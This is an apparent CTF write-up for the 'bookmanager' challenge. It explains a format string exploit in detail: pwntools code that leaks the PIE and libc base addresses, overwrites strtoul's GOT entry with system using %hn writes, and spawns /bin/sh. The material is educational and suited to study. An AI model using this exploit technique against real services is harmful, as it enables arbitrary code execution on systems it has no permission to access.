# bookmanager writeup

This challenge presents us with a book management service. It allows us to
add/delete/list/read books, using the following user friendly terminal UI:

```
Welcome to the Bookmanager 4.7

What would you like to do?
0) list books
1) read book
2) add book
3) delete book
4) exit
```

As a bonus, we are also given the `libc` library used by the server.

At the surface, this looks like a run-of-the-mill heap exploitation challenge,
where you need to overflow from one book into another, or perhaps delete a book
and read it after. This turned out not to be the case, as reverse engineering
the binary showed no obvious errors relating to overflows and use-after-free.

After some time, I spotted the problem: when reading a book, the content is
passed as the first argument to printf, which allows a classic format string
exploit. The plan of attack is to overwrite a GOT entry with system, and then making sure that the corresponding function is called with the string "/bin/sh".

But first we need to solve some technical problems:

## 1) Create a script to handle the connection and perform the exploit

We can do that using python with the `pwntools` library, which allows us to
write functions like this:

```
def del_book(pos):
    p.sendline('3')
    p.recvuntil('> ')
    p.sendline(str(pos))
    p.recvuntil('> ')
```

Automating this is important to do early on as you often need to navigate the
menu multiple times, and it makes it much easier to test the logic separately.


## 2) Find the binary base address

Before writing any binary exploit, it is important to run `checksec` or
similar:

```
[\*] 'aarhus-ctf-2019/bookmanager/bookmanager'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can see that it has basically all modern mitigations. Canaries and NX aren't
important in this case, but we need to overcome PIE (Position Independent
Executable) before proceeding further. We do that by leaking up the stack using
the format string until we find a known base pointer:

```
add_book(0, 'author', 'title', 8, "%10$llu")
base_addr = int(read_book(0)) - 6323
```

## 3) Find the libc base address

Next, we need to leak a GOT entry of some `libc` function, and use it to find
the libc base address. To do this, we create a function that adds a book
with the address we want to leak as author and the format string `%146$s` as
content, reads it to trigger the format string and then deletes the book again.
The stack offset was determined by trial and error

```
addr_offset = 146
def leak(addr):
    if '\n' in p64(addr):
        print enhex(p64(addr))
        return None
    fmt_string = "%{}$s".format(addr_offset)
    add_book(7, p64(addr), 'title', len(fmt_string), fmt_string)
    data = read_book(7)
    del_book(7)
    return data + '\x00'
```

By looking up symbols in the provided `libc` file with `readelf -s
libc-2.24.so` we can get known offsets:

```
$ readelf -s libc-2.24.so | grep fgets@
   753: 0000000000067340   408 FUNC    WEAK   DEFAULT   13 fgets@@GLIBC_2.2.5
$ readelf -s libc-2.24.so | grep system
  1353: 000000000003f480    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

Together, they allow us to find the base address of `libc`, and thus the address of `system`:

```
# Leak fgets address
fgets_leak = leak(fgets_got).ljust(8, '\x00')
fgets_addr = u64(fgets_leak[:8])

# Known offsets
fgets_offset = 0x67340
system_offset = 0x3f480

# Calculate base + system addresses
libc_base = fgets_addr - fgets_offset
system_addr = system_offset + libc_base
```

## 4) Figure out which function to overwrite

This took me far too long for no real reason: the only one that makes sense
is `strtoul`, which is the only function from libc which is called with user
controlled input as first argument.

## 5) Construct a "write-what-where"

This is the tricky part of the exploit. In order to reuse some work from
before, we reuse the same trick as before with an address in the book title
and the format string in book contents. This gives us a problem, however. We
want to construct the new `system` pointer in `strtoul`'s GOT entry 1 byte at a
time using `%hhn`, but we only have 64 bytes available in the title. Instead we
write 2 bytes at a time with `%hn`, but since we write all 8 bytes at once we
need to keep track of how much we have already written. Since math is hard We
wrote a bad algorithm that does the job:

```
# Place pointer to strtoul_got at known location
add_book(7, ''.join([p64(strtoul_got+i) for i in range(0,8,2)]), 'title', 10, 'abcd')

# Construct format string
progress = log.progress("Creating format string")
fmt_string = ''
written = 0
for i in range(0,4):
    word = p64(system_addr)[2*i:2*i+2]
    to_write = u16(word)

    value = 8
    written += 8

    while (written % 2**16) != to_write:
        value += 1
        written += 1

    fmt_string += "%.{}x%{}$hn".format(value, addr_offset+i)

```

## 6) Shell!

Now we just need to trigger the format string and send the `/bin/sh` string when the next menu appears:

```
# Trigger format string
add_book(6, 'author', 'title', len(fmt_string), fmt_string)
read_book(6)

# Send /bin/sh to strtoul (aka system)
p.clean()
p.sendline('/bin/sh\0')

# Shell!
p.interactive()
```

Flag: CTF{YoU_411_5h0uLd_r3aD_mOr3_b00k5_(Or_p4P3R5_:)}

---
*Writeup by Kristoffer from ./dirtyc0w*
